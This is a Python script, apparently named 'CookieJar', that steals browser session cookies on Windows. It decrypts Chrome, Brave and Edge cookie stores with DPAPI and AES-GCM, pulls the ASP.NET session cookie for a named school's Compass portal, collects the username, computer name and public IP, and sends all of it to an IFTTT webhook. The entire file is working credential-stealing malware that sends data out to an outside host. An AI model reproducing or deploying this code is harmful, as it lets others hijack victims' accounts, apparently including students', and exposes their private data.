# _________                __   .__            ____.             
# \_   ___ \  ____   ____ |  | _|__| ____     |    |____ _______ 
# /    \  \/ /  _ \ /  _ \|  |/ /  |/ __ \    |    \__  \\_  __ \
# \     \___(  <_> |  <_> )    <|  \  ___//\__|    |/ __ \|  | \/
#  \________/\____/ \____/|__|_ \__|\_____>________(______/__|   
      

# pip install pycryptodomex pywin32
import os
import json
import base64
import sqlite3
import requests
from shutil import copyfile
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData


def getCookie(path):

	# Copy Cookies to tmp folder
	dbpath = os.getenv("APPDATA") + '/../Local/Temp/Cookies'
	if "Chrome" in path:
		copyfile(path+"User Data/Default/Cookies", dbpath)
	else:
		copyfile(path+"User Data/Default/Network/Cookies", dbpath)

	# Load encryption key
	encrypted_key = None
	with open(path+"User Data/Local State", 'r') as file:
		encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
	encrypted_key = base64.b64decode(encrypted_key)
	encrypted_key = encrypted_key[5:]
	decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

	# Connect to the Database
	conn = sqlite3.connect(dbpath)
	cursor = conn.cursor()

	# Decode encrypted_value
	cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key='.mullauna-vic.compass.education'") 
	encrypted_value = cursor.fetchall()[0][0]
	cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
	decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:]) 

	# Remove db
	conn.commit()
	conn.close()

	# add netkey to netKeys
	return str("ASP.NET_SessionId"+decrypted_value.decode("utf-8"))

def getUsrInfo(netCookie):
	# Compass API for user data
	usrHeaders = {
		'Cookie': netCookie,
		'Content-Type': 'application/json'
	}
	usrURL = 'https://mullauna-vic.compass.education/'
	usrResponse = requests.post(usrURL, headers=usrHeaders)

	return json.loads(usrResponse.text)

def getSysInfo():
	# Get username, pc name, IP
	sysinfo = []
	sysinfo.append(os.getlogin())
	sysinfo.append(os.getenv("COMPUTERNAME"))
	sysinfo.append(requests.get('https://api.ipify.org/').text)
	return sysinfo	

def postData(data):
	# Send data to backend webhook
	postUrl = "https://maker.ifttt.com/trigger/cuck/json/with/key/15c8yZ8uW7vFMs-Wfvi17SrNF7db4z3RoerjK2ja19"
	requests.post(url=postUrl,json=data)

paths = [
	# Paths for Chrome, Brave, Edge
	os.getenv("APPDATA") + "/../Local/BraveSoftware/Brave-Browser/",
	os.getenv("APPDATA") + "/../Local/Microsoft/Edge/",
	os.getenv("APPDATA") + "/../Local/Google/Chrome/",
]

netCookies = [
	# Define netCookies table
]

for path in paths: 
	# Check path and try getCookie
	if os.path.exists(path):
		try:
			netCookies.append(getCookie(path))
			os.remove(os.getenv("APPDATA") + '/../Local/Temp/Cookies')
		except:
			continue
	else:
		continue

sysInfo = getSysInfo()

embed = {
	"fields":[
		{
			"name":"ASP.NET",
			"value":netCookies[0],
		},
		{
			"name":"Username",
			"value":sysInfo[0]
		},
		{
			"name":"PC Name",
			"value":sysInfo[1]
		},
		{
			"name":"IP",
			"value":sysInfo[2]
		},
	],
}

postData(embed)